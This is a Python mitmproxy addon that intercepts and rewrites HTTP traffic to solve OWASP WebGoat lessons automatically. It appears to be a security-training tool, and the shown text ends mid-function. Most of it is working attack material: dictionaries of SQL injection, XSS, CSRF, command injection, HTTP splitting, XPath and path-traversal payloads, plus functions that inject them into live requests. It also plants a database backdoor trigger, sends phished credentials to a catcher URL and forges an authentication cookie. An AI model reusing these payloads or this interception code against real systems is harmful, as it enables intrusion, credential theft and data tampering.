#!/usr/bin/env python
# -*- coding:utf-8 -*-
import mitmproxy.http
from mitmproxy import ctx
from mitmproxy import http
import datetime
import typing
import time
import os
import mitmproxy
from mitmproxy import exceptions
from mitmproxy import io
import mitmproxy.net.http.multipart as multipart
from setCmdColor import printBlue,printRed,printYellow,printSkyBlue,printDarkBlue
from utils.mitmSql import mitm_insert_data
from urllib.parse import quote,unquote,urlencode
from urllib import parse
from functools import wraps
import re
from bs4 import BeautifulSoup,Comment
import lxml
import json
from utils.redisQueue import RedisQueue
import base64
from mitmproxy.net.http import headers
import yaml
from config import config,interceptConfig
import importlib
'''
 mitmdump -q -s addons.py --set body-size-limit=10k "~m post"
 -q 屏蔽 mitmdump 默认的控制台日志，只显示自己脚本中的
 -s 入口脚本文件
--set body-size-limit=10k 只处理小于 10k 的请求
"~m post" 只处理 post 方法的请求
-p 8000
'''

filters = [
]
req_url_find = [
    'doLogin',
    'WebGoat'
]
res_url_find = [

]
req_header_find = [

]
res_header_find = [

]
req_params_find = [

]
res_params_find = [

]
res_status_code_find = [

]
http_split_posion_exploit = [
    " \r\nContent-Length: 0\r\n",
    "\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 35\r\n<script>alert(\"攻击成功!\")</script>",
    "\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\nLast-Modified: Tue, 28 Jan 2030 22:29:04 GMT\r\nContent-Length: 35\r\n<script>alert(\"攻击成功!\")</script>"   
]
access_control_flaws_exploit = [
 "../../../../conf/tomcat-users.xml",#Bypass a Path Based Access Control Scheme
 "DeleteProfile",#Bypass Business Layer Access Control
 "101"#Breaking Data Layer Access Control
]
ajax_security_exploit ={
    "dom_xss_one":"<IMG SRC=\"images/logos/owasp.jpg\"/>",
    "dom_xss_two":"<img src=x onerror=;;alert('XSS') />",
    "dom_xss_three":"<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>",
    "dom_xss_four":"Please enter your password:<BR><input type = \"password\" name=\"pass\"/><button onClick=\"javascript:alert('I have your password: ' + pass.value);\">Submit</button>",
    "xml_injection":'''
                    <root>
                    <reward>WebGoat t-shirt 20 Pts</reward>
                    <reward>WebGoat Secure Kettle 50 Pts</reward>
                    <reward>WebGoat Mug 30 Pts</reward>
                    <reward>WebGoat Core Duo Laptop 2000 Pts</reward>
                    <reward>WebGoat Hawaii Cruise 3000 Pts</reward>
                    </root>
                    '''
}
xss_exploit = {
    'phishing':'''
    </form>
    <script>function hack(){ XSSImage=new Image; XSSImage.src="http://localhost/WebGoat/catcher?PROPERTY=yes&user="+ document.phish.user.value + "&password=" + document.phish.pass.value + "";
     alert("Had this been a real attack... Your credentials were just stolen. User Name = " + document.phish.user.value + "Password = " + document.phish.pass.value);} 
     </script><form name="phish"><br><br><HR><H3>This feature requires account login:</H3 ><br><br>Enter Username:<br>
     <input type="text" name="user"><br>Enter Password:<br><input type="password" name = "pass"><br>
     <input type="submit" name="login" value="login" onclick="hack()"></form><br><br><HR>
    ''',
    'reflected_XSS':'''
    <script>alert("success!");</script>
    ''',
    'csrf':'''
    <img src="http://localhost/WebGoat/attack?Screen=33&menu=900&amp;transferFunds=5000" width="1" height="1">
    ''',
    'csrf_bypass':'''
    <iframe
	src="http://localhost/WebGoat/attack?Screen=32&menu=900&transferFunds=400"
	id="myFrame" frameborder="1" marginwidth="0"
	marginheight="0" width="800" scrolling=yes height="300"
	onload="document.getElementById('frame2').src='http://localhost/WebGoat/attack?Screen=32&menu=900&transferFunds=CONFIRM';">
    </iframe>
	<iframe
	id="frame2" frameborder="1" marginwidth="0"
	marginheight="0" width="800" scrolling=yes height="300">
    </iframe>
    '''
}
command_Injection = {
    'win':'''
    " & netstat -an & arp -a & dir
    ''',
    'linux':'''
    && arp -a
    '''
}
number_sql_injection = {
    'test_sucess':''' and 1=1''',
    'test_error':''' and 1=2''',
    'guess_fields':''' order by ''',#猜测字段数，后接字数字
    'guess_fields_seat':'''
     union select 
    ''',#猜测字段的位数，后接字段的位置，例如：如果字段数是3，则接 1,2,3
    'guess_db_name':'''
     and 1=2 union select 1,database(),
    ''',#猜测数据库名，如果字段数是3，则接 3
    'guess_table_name':'''
     and 1=2 union select 1,group_concat(table_name),
    ''',#猜表名，database(),如果字段数是4 则接 3,4 from information_schema.tables where table_schema=database()
    'guess_column_name':'''
    and 1=2 union select 1,group_concat(column_name),
    ''',#猜列名，如果字段是3 则接3 from information_schema.columns where table_name='表名'
    'guess_datas':'''
    union select 1,group_concat(id,title,content)，
    ''',#猜数据，如果字段是3 则接 3 from 表名
    'all':'''
     or 1=1
    ''' #显示全部数据
}
string_sql_injection = {
    'all':'''' or '1'='1'''
}
log_spoofing = {
    'crlf':'''
    %0d%0aLogin Succeeded for username admin
    '''
}
xpath_injection = {
    'all':'''
    ' or 1=1 or 'a'='a
    ''',#构造两个or是为了绕过后面的and
    'guess_node_num':'''
    ' or count(//employee/child::node())=
    ''',
    'or':'''
    or 'a'='a
    '''
}
lab_sql_injection = {
    'stage3':''' or 1=1 order by salary desc limit 1 '''
}
modify_data_sql_injection = {
    'modify':''''; UPDATE salaries SET salary=1000 WHERE userid='jsmith'''
}
#(method,url,headers,params,create_time,system_name,is_request,is_response
data_dict = {
    'method':'',
    'url':'',
    'headers':'',
    'params':'',
    'create_time':'',
    'system_name':'',
    'is_request':0,
    'is_response':0
}
response_switch = True
rq = RedisQueue('rq')
class MitmProxyAddon:
    '''
    http 生命周期
    '''
    auth_cookie = ''
    def http_connect(self,flow:mitmproxy.http.HTTPFlow):
        pass   
    def requestsheaders(self,flow:mitmproxy.http.HTTPFlow):
        pass
    def request(self,flow:mitmproxy.http.HTTPFlow):
        conf = config()
        filters = conf.get_filters()
        sign = conf.get_owasp_sign()
        exploit = conf.get_owasp_exploit()
        otype = conf.get_owasp_type()
        interceptReq = conf.get_intercept_req()
        if flow.request.pretty_host in filters:
            if interceptReq:
                self.my_api_requset_intercept(flow)
            data_dict['method'],data_dict['url'],data_dict['headers'],data_dict['params'] = self.my_api_band_Parameters(flow)
            data_dict['system_name'] = flow.request.pretty_host
            data_dict['create_time'] = self.my_tools_get_timestamp_str()
            data_dict['is_request'] = 1
            data_dict['is_response'] = 0
            data_dict['headers'] = str(data_dict['headers'])
            #for r in req_url_find:
                #if data_dict['url'].find(r) >=0:
            if self.my_tools_filter_url(data_dict['url']):
                mitm_insert_data(data_dict)
                rq.put(json.dumps(data_dict))             
            flow = self.my_api_modify_request(flow)
            #self.my_exploit_Multi_Level_Login_two_stage_2(flow)
            if data_dict['url'].find('?') > 0:
                split_url = data_dict['url'].split('?')
                if split_url[1] == sign and otype == "req":
                    module = importlib.import_module("owaspbreak")
                    func = getattr(module,exploit)
                    func(flow)
                    self.my_api_push_info(flow)
            elif data_dict['url'] == sign and otype == "req":
                module = importlib.import_module("owaspbreak")
                func = getattr(module,exploit)
                func(flow)
                self.my_api_push_info(flow)                

    def responseheaders(self,flow:mitmproxy.http.HTTPFlow):
        pass
    def response(self,flow:mitmproxy.http.HTTPFlow):
        rep_dict = {

        }
        conf = config()
        response_switch = conf.get_resp()
        filters = conf.get_filters()
        sign = conf.get_owasp_sign()
        exploit = conf.get_owasp_exploit()
        otype = conf.get_owasp_type()
        interceptResp = conf.get_intercept_resp()
        result = ''
        if response_switch:
            if flow.request.pretty_host in filters:
                if interceptResp:
                    self.my_api_response_intercept(flow)
                status_code = flow.response.status_code
                rep_text = flow.response.text
                headers = flow.response.headers
                headerDict = {}
                for k,v in headers.items():
                    headerDict[k] = v
                headers_list = headerDict
                is_json = self.my_tools_is_json(headers_list)
                if flow.request.url.find("?") > 0:
                    url_query = flow.request.url.split('?')[1]
                    if url_query == 'Screen=8&menu=1800':
                        self.my_api_find_resp_cookies(flow)
                    if otype == "resp" and url_query == sign:
                        module = importlib.import_module("owaspbreak")
                        func = getattr(module,exploit)
                        result = func(flow)
                        print(result)                  
                rep_dict['type'] = "response"
                rep_dict['status_code'] = status_code
                rep_dict['headers_list'] = headers_list
                rep_dict["rep_text"] = rep_text
                rep_dict['owasp_exec'] = result
                rq.put(json.dumps(rep_dict))
                flow = self.my_api_modify_response(flow)#包装
    #过滤带参数的post和get请求
    def my_api_band_Parameters(self,flow:mitmproxy.http.HTTPFlow):
        method  = self.my_tools_byte_to_str(flow.request.data.method)
        url = flow.request.pretty_url
        headers = flow.request.headers
        headersDict = {}
        paramsDict = {}
        params_multipart = []
        for name, value in headers.items():
            headersDict[name] = value
        params = ''
        if method != '':
            if method == 'POST':
                if 'Content-Type' in headersDict.keys():
                    if headersDict['Content-Type'].find('multipart') >= 0:
                        #multipart_params = flow.request.urlencoded_form.items(multi=True)
                        #print(multipart_params)
                        multipart_params =self.decode_params_multipart(flow.request.headers, flow.request.content)
                        #print(multipart_params)
                        if isinstance(flow.request.data.content,bytes):
                            for name,value in flow.request.multipart_form.items():
                                paramsDict[name] = value
                            #print(paramsDict[b'SUBMIT'])
                            #params = str(paramsDict)
                            for k in paramsDict.keys():
                                params_multipart.append(k)
                            params = str(b','.join(params_multipart),encoding="utf-8")
                        else:
                            params = ''
                    else:
                        params = self.my_tools_byte_to_str(flow.request.data.content)
                else:
                    params = self.my_tools_byte_to_str(flow.request.data.content)
                if params != '':
                    pass
                    '''
                    printSkyBlue('++++++++++++++++Request+++++++++++++++++\n')
                    printSkyBlue(u'method:%s    url:%s\n'%(method,flow.request.pretty_url))
                    printSkyBlue(u'headers:%s\n'%(flow.request.headers))
                    printRed(u'params:%s\n'%(params))
                    '''
            elif method == 'GET':
                params = flow.request.query
                #printRed(u'query:%s\n'%(params))
                if params:
                    url = flow.request.url
                    params = url.split('?')[1]
                    '''
                    printYellow('++++++++++++++++Request+++++++++++++++++\n')
                    printYellow(u'method:%s   url:%s\n'%(method,flow.request.pretty_url))
                    printYellow(u'headers:%s\n'%(flow.request.headers))
                    printRed(u'params:%s\n'%(params))
                    '''
                else:
                    params = ''
        return method,url,headersDict,params
    def my_api_intercept(self,flow:mitmproxy.http.HTTPFlow):
        pass
    #拦截响应替换数据
    def my_api_response_intercept(self,flow:mitmproxy.http.HTTPFlow):
        conf = config()
        iconf = interceptConfig()
        urls = conf.get_intercept_url()
        flag = conf.get_intercept_resp()
        fheaders = flow.request.headers
        method  = self.my_tools_byte_to_str(flow.request.data.method)
        currentUrl = flow.request.pretty_url
        statusCode = flow.response.status_code
        respText = flow.response.get_text()
        headers = flow.response.headers
        if flag and urls:
            for url in urls:
                if url == currentUrl:
                    resp = iconf.get_intercept_url_resp(url)
                    if resp:
                        headers = resp['headers']
                        params = resp['params']
                        if headers != "none":
                            if headers.find("#") > 0:
                                mheaders = headers.split("#")
                                for m in mheaders:
                                    if m.find("_") > 0 :
                                        key,value = m.split("_")
                                        if value == "none":
                                            value = ''
                                        if value == "del":
                                            if key in fheaders.keys():
                                                del flow.response.headers[key]
                                        else:
                                            if key in fheaders.keys():
                                                flow.response.headers[key] = value
                            elif headers.find("_") > 0 :
                                key,value = headers.split("_")
                                if value == "none":
                                    value = ''
                                if value == "del":
                                    if key in fheaders.keys():
                                        del flow.response.headers[key]
                                else:
                                    if key in fheaders.keys():
                                        flow.response.headers[key] = value
                        if params != "none":
                            if params.find("#") > 0:
                                mparams = params.split("#")
                                for m in mparams:
                                    if m.find("_") > 0:
                                        v,s = m.split("_")
                                        if s == "del":
                                            if respText.find(v) > 0:
                                                respText = respText.replace(v,"")
                                                flow.response.set_text(respText)
                                        else:
                                            if respText.find(v) > 0:
                                                respText = respText.replace(v,s)
                                                flow.response.set_text(respText)                                    
                            elif params.find("_") > 0:                            
                                v,s = params.split("_")
                                if s == "del":
                                    if respText.find(v) > 0:
                                        respText = respText.replace(v,"")
                                        flow.response.set_text(respText)
                                else:
                                    if respText.find(v) > 0:
                                        respText = respText.replace(v,s)
                                        flow.response.set_text(respText)                                                                
    #拦截请求替换数据
    def my_api_requset_intercept(self,flow:mitmproxy.http.HTTPFlow):
        conf = config()
        iconf = interceptConfig()
        urls = conf.get_intercept_url()
        flag = conf.get_intercept_req()
        fheaders = flow.request.headers
        method  = self.my_tools_byte_to_str(flow.request.data.method)
        currentUrl = flow.request.pretty_url
        if flag and urls:
            for url in urls:
                if url == currentUrl:
                    req = iconf.get_intercept_url_req(url)
                    if req:
                        headers = req['headers']
                        params = req['params']
                        if headers != "none":
                            if headers.find("#") > 0:
                                mheaders = headers.split("#")
                                for m in mheaders:
                                    if m.find("_") > 0 :
                                        key,value = m.split("_")
                                        if value == "none":
                                            value = ''
                                        if value == "del":
                                            if key in fheaders.keys():
                                                del flow.request.headers[key]
                                        else:
                                            if key in fheaders.keys():
                                                flow.request.headers[key] = value
                            elif headers.find("_") > 0 :
                                key,value = headers.split("_")
                                if value == "none":
                                    value = ''
                                if value == "del":
                                    if key in fheaders.keys():
                                        del flow.request.headers[key]
                                else:
                                    if key in fheaders.keys():
                                        flow.request.headers[key] = value
                                        
                        if params != "none":
                            if params.find("#") > 0:
                                mparams = params.split("#")
                                for m in mparams:
                                    if m.find("_") > 0:
                                        v,s = m.split("_")
                                        if s == "del":
                                            if method == "GET":
                                                url = flow.request.url 
                                                if url.find(v) > 0:
                                                    url = url.replace(v,"")
                                                    flow.request.url = url
                                            elif method == "POST":
                                                params = flow.request.urlencoded_form
                                                for k in params.keys():
                                                    if flow.request.urlencoded_form[k] == v:
                                                        flow.request.urlencoded_form[k] = ""
                                        else:
                                            if method == "GET":
                                                url = flow.request.url 
                                                if url.find(v) > 0:
                                                    url = url.replace(v,s)
                                                    flow.request.url = url
                                            elif method == "POST":
                                                params = flow.request.urlencoded_form
                                                for k in params.keys():
                                                    if flow.request.urlencoded_form[k] == v:
                                                        flow.request.urlencoded_form[k] = s                                        
                            elif params.find("_") > 0:                            
                                v,s = params.split("_")
                                if s == "del":
                                    if method == "GET":
                                        url = flow.request.url 
                                        if url.find(v) > 0:
                                            url = url.replace(v,"")
                                            flow.request.url = url
                                    elif method == "POST":
                                        params = flow.request.urlencoded_form
                                        for k in params.keys():
                                            if flow.request.urlencoded_form[k] == v:
                                                flow.request.urlencoded_form[k] = ""
                                else:
                                    if method == "GET":
                                        url = flow.request.url 
                                        if url.find(v) > 0:
                                            url = url.replace(v,s)
                                            flow.request.url = url
                                    elif method == "POST":
                                        params = flow.request.urlencoded_form
                                        for k in params.keys():
                                            if flow.request.urlencoded_form[k] == v:
                                                flow.request.urlencoded_form[k] = s
    def my_api_push_info(self,flow):
        data_dict['method'],data_dict['url'],data_dict['headers'],data_dict['params'] = self.my_api_band_Parameters(flow)
        data_dict['system_name'] = flow.request.pretty_host
        data_dict['create_time'] = self.my_tools_get_timestamp_str()
        data_dict['is_request'] = 1
        data_dict['is_response'] = 0
        data_dict['headers'] = str(data_dict['headers'])
        for r in req_url_find:
            if data_dict['url'].find(r) >=0:
                if self.my_tools_filter_url(data_dict['url']):
                    rq.put(json.dumps(data_dict))        
    def my_exploit_http_split(func):
        def http_split(self,flow:mitmproxy.http.HTTPFlow):
            method  = flow.request.method
            params = ''
            if method != "":
                if method == "POST":
                    #修改参数
                    if flow.request.urlencoded_form:
                        #截断参数构造
                        truncation = self.my_tools_url_encode(http_split_posion_exploit[0])
                        #第二次污染请求构造
                        attack = self.my_tools_url_encode(http_split_posion_exploit[1])
                        flow.request.urlencoded_form['language'] = flow.request.urlencoded_form['language'] + truncation
                        flow.request.urlencoded_form['language'] = flow.request.urlencoded_form['language'] + attack
                if method == "GET":
                    pass        
        return http_split
    def my_exploit_http_cache_poisoning(func):
        def http_cache_poisoning(self,flow:mitmproxy.http.HTTPFlow):
            method = flow.request.method
            params = ""
            if method != "":
                if method == "POST":
                    if flow.request.urlencoded_form:
                        #截断参数构造
                        truncation = self.my_tools_url_encode(http_split_posion_exploit[0])
                        #第二次缓存投毒 添加last-modify参数
                        attack = self.my_tools_url_encode(http_split_posion_exploit[2])
                        flow.request.urlencoded_form['language'] = flow.request.urlencoded_form['language'] + truncation
                        flow.request.urlencoded_form['language'] = flow.request.urlencoded_form['language'] + attack
            return func(self,flow)
        return http_cache_poisoning
    def my_exploit_http_split_simulation_response(func):
        def simulation_response(self,flow:mitmproxy.http.HTTPFlow):
            resp_content = flow.response.get_text()
            simulation_content = "<script>alert(\"攻击成功!\")</script>"
            if resp_content.find("Stage 1: HTTP Splitting")>0 and  resp_content.find("Good Job")>0 :
                resp_lists = resp_content.split("</body>")
                resp_content = resp_lists[0]+simulation_content+resp_lists[1]
                flow.response.set_text(resp_content)
            return func(self,flow)
        return simulation_response
    def my_exploit_xml_injection_response(self,flow:mitmproxy.http.HTTPFlow):
        if self.my_tools_filter_xml(flow):
            if flow.response.text.find("t-shirt") > 0:
                flow.response.set_text(ajax_security_exploit['xml_injection'])
    def my_exploit_json_injection_response(self,flow:mitmproxy.http.HTTPFlow):
        if self.my_tools_filter_json(flow):
            json_content = json.loads(flow.response.text)
            if "flights" in json_content:
                for i in range(len(json_content['flights'])):
                    if json_content['flights'][i]["price"] == "$600":
                        json_content['flights'][i]["price"] = "$100"
            flow.response.set_text(json.dumps(json_content))
    def packing_my_exploit_access_control(testType):
        def my_exploit_access_control_flaws(func):
            def access_control_flaws(self,flow:mitmproxy.http.HTTPFlow):
                bypass_path = "Screen=24&menu=200"
                bypass_Presentational = "Screen=34&menu=200"
                url = flow.request.url
                if url.find("?") > 0:
                    url_split = url.split("?")
                    if url.find(bypass_path) > 0 :
                        flow.request.urlencoded_form['File'] = access_control_flaws_exploit[0]
                    if testType == 1:
                        if url_split[1] == bypass_Presentational and flow.request.urlencoded_form["action"] != "Login":
                            flow.request.urlencoded_form['action'] = access_control_flaws_exploit[1]
                    elif testType == 2:
                        if url_split[1] == bypass_Presentational and flow.request.urlencoded_form["action"] != "Login":
                            flow.request.urlencoded_form['employee_id'] = access_control_flaws_exploit[2] 
                return func(self,flow)
            return access_control_flaws
        return my_exploit_access_control_flaws
    def packing_my_exploit_ajax_security(testType):
        def my_exploit_ajax_security(func):
            def dom_based_xss(self,flow:mitmproxy.http.HTTPFlow):
                dom_xss = "Screen=11&menu=400"
                url = flow.request.url
                if url.find("?")>0:
                    url_split = url.split("?")
                    if url_split[1] == dom_xss:
                        params = flow.request.urlencoded_form['person']
                        if params == "stage1":
                            flow.request.urlencoded_form['person'] = ajax_security_exploit["dom_xss_one"]
                        elif params == "stage2":
                            flow.request.urlencoded_form['person'] = ajax_security_exploit['dom_xss_two']
                        elif params == "stage3":
                            flow.request.urlencoded_form['person'] = ajax_security_exploit['dom_xss_three']
                        elif params == "stage4":
                            flow.request.urlencoded_form['person'] = ajax_security_exploit['dom_xss_four']
                        else:
                            pass
                return func(self,flow)
            return dom_based_xss
        return my_exploit_ajax_security
    #@my_exploit_http_split#http拆分
    #@my_exploit_http_cache_poisoning#http缓存投毒
    #@packing_my_exploit_access_control(2)
    @packing_my_exploit_ajax_security(1)
    def my_api_modify_request(self,flow:mitmproxy.http.HTTPFlow):
        return flow
    def my_exploit_base_authentication(self,flow:mitmproxy.http.HTTPFlow):
        headers = flow.request.headers
        dictHeaders = {}
        for key,value in headers.items():
            dictHeaders[key] = value
        if 'Authorization' in dictHeaders.keys():
            print(base64.b64decode(dictHeaders['Authorization'].split(' ')[1]).decode('utf-8'))
    def my_exploit_DOM_Injection(self,flow:mitmproxy.http.HTTPFlow):
        re_dis = re.compile('disabled=\"\"',re.I)
        resp_content = flow.response.get_text()
        if resp_content.find("disabled") > 0:
            replace_content = re_dis.sub('',resp_content)
            flow.response.set_text(replace_content)

    def my_exploit_Client_Side_Filtering(self,flow:mitmproxy.http.HTTPFlow):
        resp_content = flow.response.get_text()
        bsoup = BeautifulSoup(html,"lxml")
        table = bsoup.table
        print(table)
    def my_exploit_Multi_Level_Login_one_stage_2(self,flow:mitmproxy.http.HTTPFlow):
        params = flow.request.urlencoded_form
        if 'hidden_tan' in params.keys():
            flow.request.urlencoded_form['hidden_tan'] = 1
    def my_exploit_Multi_Level_Login_two_stage_2(self,flow:mitmproxy.http.HTTPFlow):
        params = flow.request.urlencoded_form
        if 'hidden_user' in params.keys():
            flow.request.urlencoded_form['hidden_user'] = 'Jane'
    def my_exploit_phishing_with_xss(self,flow):
        flow.request.urlencoded_form['Username'] = xss_exploit["phishing"]
    def my_exploit_reflected_xss(self,flow:mitmproxy.http.HTTPFlow):
        params = flow.request.urlencoded_form
        if 'search_name' in params.keys():
            flow.request.urlencoded_form['search_name']=xss_exploit['reflected_XSS']
    def my_exploit_csrf(self,flow:mitmproxy.http.HTTPFlow):
        params = flow.request.urlencoded_form
        if 'message' in params.keys():
            flow.request.urlencoded_form['message'] = xss_exploit['csrf']
    def my_exploit_csrf_bypass(self,flow:mitmproxy.http.HTTPFlow):
        params = flow.request.urlencoded_form
        if 'message' in params.keys():
            flow.request.urlencoded_form['message'] = xss_exploit['csrf_bypass']
    def my_exploit_improper_error_handling(self,flow:mitmproxy.http.HTTPFlow):
        params = flow.request.urlencoded_form
        if 'Password' in params.keys():
            del flow.request.urlencoded_form['Password']
    def my_exploit_command_injection(self,flow:mitmproxy.http.HTTPFlow):
        params = flow.request.urlencoded_form
        if 'HelpFile' in params.keys():
            #helpFile = flow.request.urlencoded_form['HelpFile']
            flow.request.urlencoded_form['HelpFile'] = command_Injection['win']
    def my_exploit_number_sql_injection(self,flow:mitmproxy.http.HTTPFlow):
        params = flow.request.urlencoded_form
        if 'station' in params.keys():
            station = flow.request.urlencoded_form['station']
            flow.request.urlencoded_form['station'] = station + number_sql_injection['all']
    def my_exploit_log_spoofing(self,flow:mitmproxy.http.HTTPFlow):
        params = flow.request.urlencoded_form
        if 'username' in params.keys():
            username = flow.request.urlencoded_form['username']
            flow.request.urlencoded_form['username'] = username + log_spoofing['crlf']
    def my_exploit_xpath_injection(self,flow:mitmproxy.http.HTTPFlow):
        params = flow.request.urlencoded_form
        if 'Username' in params.keys():
            username = flow.request.urlencoded_form['Username']
            flow.request.urlencoded_form['Username'] = username + xpath_injection['all']
    def my_exploit_string_sql_injection(self,flow:mitmproxy.http.HTTPFlow):
        params = flow.request.urlencoded_form
        if 'password' in params.keys():
            password = flow.request.urlencoded_form['password']
            flow.request.urlencoded_form['password'] = password + string_sql_injection['all']
        elif 'account_name' in params.keys():
            account_name = flow.request.urlencoded_form['account_name']
            flow.request.urlencoded_form['account_name'] = account_name + string_sql_injection['all']
    def my_exploit_lab_number_sql_injection(self,flow:mitmproxy.http.HTTPFlow):
        params = flow.request.urlencoded_form
        if 'action' in params.keys():
            if params['action'] == 'ViewProfile':
                employId = flow.request.urlencoded_form['employee_id']
                flow.request.urlencoded_form['employee_id'] = employId + lab_sql_injection['stage3']
    def my_exploit_modify_data_sql_injection(self,flow:mitmproxy.http.HTTPFlow):
        params = flow.request.urlencoded_form
        if 'userid' in params.keys():
            userid = flow.request.urlencoded_form['userid']
            flow.request.urlencoded_form['userid'] = userid + modify_data_sql_injection['modify']
    def my_exploit_database_backdoor(self,flow:mitmproxy.http.HTTPFlow):
        params = flow.request.urlencoded_form
        exploit = "; update employee set salary=10000"
        exploit_backdoor = ''';CREATE TRIGGER myBackDoor BEFORE INSERT ON employee FOR EACH ROW BEGIN UPDATE employee SET email='john@hackme.com' WHERE userid = NEW.userid'''
        if 'username' in params.keys():
            username = params['username']            
            if str(params['username']) == "102":
                flow.request.urlencoded_form['username'] = username + exploit_backdoor
            else:
                flow.request.urlencoded_form['username'] = username + exploit
    def my_exploit_Denial_of_Service(self,flow:mitmproxy.http.HTTPFlow):
        params = flow.request.urlencoded_form
        if 'Password' in params.keys():
            flow.request.urlencoded_form['Password'] = params['Password'] + string_sql_injection['all']
    def my_exploit_Bypass_HTML_Field_Restrictions(self,flow:mitmproxy.http.HTTPFlow):
        params = flow.request.urlencoded_form
        #select=foo&radio=foo&checkbox=on&shortinput=12345&SUBMIT=Submit
        if 'select' in params.keys() and \
            'radio' in params.keys() and \
            'checkbox' in params.keys():
            flow.request.urlencoded_form['select'] = "test"
            flow.request.urlencoded_form['radio'] = "test"
            flow.request.urlencoded_form['checkbox'] = "test"
            flow.request.urlencoded_form['disabledinput'] = "test"
            flow.request.urlencoded_form['shortinput'] = "testtesttest"
            flow.request.urlencoded_form['SUBMIT'] = "test"
    def my_exploit_Exploit_Hidden_Fields(self,flow:mitmproxy.http.HTTPFlow):
        params = flow.request.urlencoded_form
        if 'Price' in params.keys():
            flow.request.urlencoded_form['Price'] = 1
    def my_exploit_Exploit_Unchecked_Email(self,flow:mitmproxy.http.HTTPFlow):
        params = flow.request.urlencoded_form
        if 'msg' in params.keys():
            flow.request.urlencoded_form['msg'] = "<script>alert(\"test\")</script>"
            if flow.request.urlencoded_form['subject'] == 'lesson2':
                flow.request.urlencoded_form['to'] = "myfriend@test.com"
    def my_exploit_Bypass_Client_Side_JavaScript_Validation(self,flow:mitmproxy.http.HTTPFlow):
        params = flow.request.urlencoded_form
        if 'field1' in params.keys() and 'field2' in params.keys():
            flow.request.urlencoded_form['field1'] = "ABC"
            flow.request.urlencoded_form['field2'] = "12345!!"
            flow.request.urlencoded_form['field3'] = "1w2er3!@#wwe"
            flow.request.urlencoded_form['field4'] = "!@#wwe"
            flow.request.urlencoded_form['field5'] = "!@#wwe"
            flow.request.urlencoded_form['field6'] = "!@#wwe"
            flow.request.urlencoded_form['field7'] = "!@#wwe"
    def my_exploit_Spoof_an_Authentication_Cookie(self,flow:mitmproxy.http.HTTPFlow):
        params = flow.request.urlencoded_form
        header = flow.request.headers
        print(self.auth_cookie)
        if 'Username' in params.keys():
            if params['Username'] == 'alice':
                if self.auth_cookie:
                    if 'Cookie' in header.keys():
                        #header['Cookie'] = header['Cookie'] + ";" + self.auth_cookie
                        number = filter(str.isdigit,self.auth_cookie)
                        str_number = ''.join(number)
                        flow.request.headers['Cookie'] = header['Cookie'] + ";AuthCookie=" + str_number+"fdjmb"
                        print(flow.request.headers['Cookie'])
    #@my_exploit_http_split_simulation_response
    def my_api_modify_response(self,flow:mitmproxy.http.HTTPFlow):
        self.my_tools_parse_html(flow.response.text)
        #self.my_tools_parse_html_filter(flow.response.text,"td")
        #self.my_tools_filter_xml(flow)
        #self.my_exploit_xml_injection_response(flow)
        #self.my_exploit_json_injection_response(flow)
        #self.my_tools_parse_html_comment(flow.response.text)
        return flow
    def my_api_find_resp_cookies(self,flow:mitmproxy.http.HTTPFlow):
        if 'Set-Cookie' in flow.response.headers.keys():
            self.auth_cookie =flow.response.headers['Set-Cookie']
            print(self.auth_cookie)
    def my_tools_byte_to_str(self,param):
        if isinstance(param,bytes):
            return str(param,encoding='utf-8')
        else:
            return ''
    def my_tools_str_to_byte(self,param):
        if isinstance(param,str):
            return bytes(param,encoding='utf8')
        else:
            return ''       
    def my_tools_is_json(self,param):
        for p in param:
            if str(p).find('application/json') != -1:
                return True
        return False
    def my_tools_open_file(self,path):
        if path.startswith("+"):
            path = path[1:]
            mode = 'ab'
        else:
            mode = "wb"
        path = os.path.expanduser(path)
        return open(path,mode)
    def my_tools_get_timestamp_str(self):
        t = time.time()
        tt = int(t)
        return str(tt)
    def my_tools_save_flow_to_txt(self,flows:typing.Sequence[mitmproxy.flow.Flow],path:mitmproxy.types.Path):
        try:
            f = self.my_tools_open_file(path)
        except IOError as v:
            raise exceptions.CommandError(v) from v
        stream = io.FlowWriter(f)
        for i in flows:
            stream.add(i)
        f.close()
    def my_tools_url_encode(self,param):
        urlEncode = quote(param)
        return urlEncode
    def my_tools_url_to_dict(self,param):
        params = parse.parse_qs(param)
        result = {key:params[key][0] for key in params}
        return result
    def my_tools_dict_to_url(self,param):
        return urlencode(param)
    def my_tools_urlencode(self,param):
        return unquote(param)
    def my_tools_filter_url(self,param):
        p = re.compile(r'.*\.(js|gif|jpg|png|css|ico|swf|axd.*)$',re.I)
        result = p.search(param)
        if result is None:
            return True
        else:
            return False
    def my_tools_filter_js(self,param):
        p = re.compile(r'.*\.(js)$',re.I)
        result = p.search(param)
        if result is not None:
            return True
        else:
            return False
    def my_tools_parse_html(self,html):
        bsoup = BeautifulSoup(html,"lxml")
        if bsoup.input:
            for i in bsoup.find_all("input"):
                if "disabled" in i.attrs:
                    printYellow(u'禁用的元素:%s\n'%(str(i)))
                elif "hidden" in i.attrs:
                    printYellow(u'隐藏的元素:%s\n'%(str(i)))
                elif "type" in i.attrs:
                    print(i.attrs["type"])
                    if i.attrs["type"] == "hidden":
                        printYellow(u'隐藏的元素:%s\n'%(str(i)))
    def my_tools_parse_html_filter(self,html,tag):
        bsoup = BeautifulSoup(html,"lxml")
        tags = bsoup.find_all(tag)
        if tags:
            print(tags)
    def my_tools_parse_html_comment(self,html):
        bsoup = BeautifulSoup(html,"lxml")
        for comment in bsoup.findAll(text=lambda text:isinstance(text,Comment)):
            print(comment)
    def my_tools_filter_xml(self,flow:mitmproxy.http.HTTPFlow):
        for k in flow.response.headers.keys():
            if flow.response.headers.get(k) == "text/xml":
                return flow
        return None
    def my_tools_filter_json(self,flow:mitmproxy.http.HTTPFlow):
        try:
            json.loads(flow.response.text)
        except Exception as e:
            return False
        return True
    def decode_params_multipart(self,hdrs, content):

        v = hdrs.get("content-type")
        if v:
            v = headers.parse_content_type(v)
            if not v:
                return []
            try:
                boundary = v[2]["boundary"].encode("ascii")
            except (KeyError, UnicodeError):
                return []

            rx = re.compile(br'\bname="([^"]+)"')
            rxf = re.compile(br'\bname="([^"]+)";\s*filename="(.*?)"')
            r = {}

            for i in content.split(b"--" + boundary):
                parts = i.splitlines()
                if len(parts) > 1 and parts[0][0:2] != b"--":
                    match = rxf.search(parts[1])
                    print(parts)
                    if match:
                        key = match.group(1)
                        value = b"\n".join(parts[3 + parts[2:].index(b""):])
                        filename = match.group(2)
                        if(not key in r):
                            r[key] = []
                        r[key].append({
